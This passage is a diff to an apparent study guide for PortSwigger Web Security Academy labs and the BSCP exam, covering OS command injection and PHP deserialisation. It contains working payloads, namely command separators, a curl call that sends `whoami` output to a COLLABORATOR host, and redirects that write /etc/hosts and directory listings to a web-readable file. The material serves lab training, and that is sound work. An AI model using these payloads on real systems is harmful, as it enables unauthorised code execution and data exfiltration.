@@ -2918,12 +2918,25 @@ echo $cookie;
 >Replace cookie value and send request to get remote code execution (RCE) when cookie is deserialised server side. Ignore the server response ```HTTP/2 500 Internal Server Error```, check the collaborator if data was received.  
 
 [PortSwigger Lab: Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)  
-   
-  
   
 ## OS Command Injection
 
 ### Feedback  
+
+>Use following command separation characters to ***identify*** Operating System Command injection vulnerabilities.  
+
+```
+ &&
+ &
+ ||
+ |
+ ;
+ `
+ '
+ "
+ 0x0a
+ \n
+```  
 
 >The target application **submit feedback** function require email value, and ***identifying*** blind OS command injection by appending ```||curl COLLABORATOR.net||``` bash command, we then can observe a request made to Collaborator.  
   
@@ -2938,7 +2951,35 @@ email=carlos@exam.net||curl+`whoami`.COLLABORATOR.net||
 ![OS command injection](images/os-command-inject.png)  
 
 [PortSwigger Lab: Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)  
- 
+  
+### Output redirection  
+
+>If OS command injection ***identified***, and filter in place preventing complex command injection, attempt to redirect output to writable folder. ***Identify*** a **path traversal** vulnerability that allow reading of files only in current WEB APP.  
+
+>***Identify*** the working directory using `pwd` command output redirected, and appending to `output.txt` file every bash command stdout.  
+
+```
+||pwd>output.txt||
+||echo>>output.txt||
+||cat+/etc/hosts>>/var/www/images/output.txt||
+||echo>>output.txt||
+||ls+-al>>/var/www/images/output.txt||
+||echo>>output.txt||
+||whoami>>/var/www/images/output.txt||
+```  
+
+>Use working directory discovered using above `pwd` command to redirect output and read content.  
+
+![os cmd path traversal lfi](images/os-cmd-path-traversal-lfi)  
+
+>Get output file content.  
+
+```
+GET /image?filename=output.txt HTTP/2
+```  
+  
+[PortSwigger Lab: Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)  
+  
 # Appendix  
 
 >This section contain **additional** information to solving the PortSwigger labs and approaching the BSCP exam, such as the Youtube content creators, Burp speed scanning technique, python scripts and [Obfuscation](#obfuscation) techniques to bypass filters.   
